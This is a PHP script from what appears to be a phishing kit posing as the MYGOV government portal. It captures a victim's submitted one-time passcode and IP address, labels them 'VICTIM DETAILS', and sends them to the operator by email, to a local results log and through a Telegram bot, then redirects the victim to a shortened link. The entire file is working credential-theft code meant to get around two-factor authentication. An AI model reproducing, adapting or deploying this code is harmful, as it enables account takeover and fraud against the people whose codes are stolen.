<?php
$settings = include '../../../settings/settings.php';




# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables

$otp = $_POST['otp1'];



# Messsage

$message = "[ 🍁 MYGOV | CLIENT : {$client} 🍁 ]\n\n";
$message .= "********** [ RE-CODE ] **********\n";
$message .= "# OTP       : {$otp}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From:<mygov@client_{$client}_site.com>" . "\r\n";
    $subject = "🍁MYGOV 🍁 RE-CODE 🍁 CLIENT #{$client} 🍁 {$IP}";
    $msg =$message;
    mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
    $results = fopen($filename, "a+");
    fwrite($results,$message);
    fclose($results);
}

# Send Bot

if ($settings['telegram'] == "1") {
    $data = $message;  // Ensure $message is defined somewhere before this code
    $website = "https://api.telegram.org/{$settings['bot_url']}";  

    foreach ($chat_ids as $chat_id) {
        $send = ['chat_id' => $chat_id, 'text' => $data];

        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);

        // You can add error handling here based on the $result if desired.

        curl_close($ch);
    }
}



    echo "<script>window.location.href =\"https://bit.ly/3JN8CFY\"; </script>";

?>
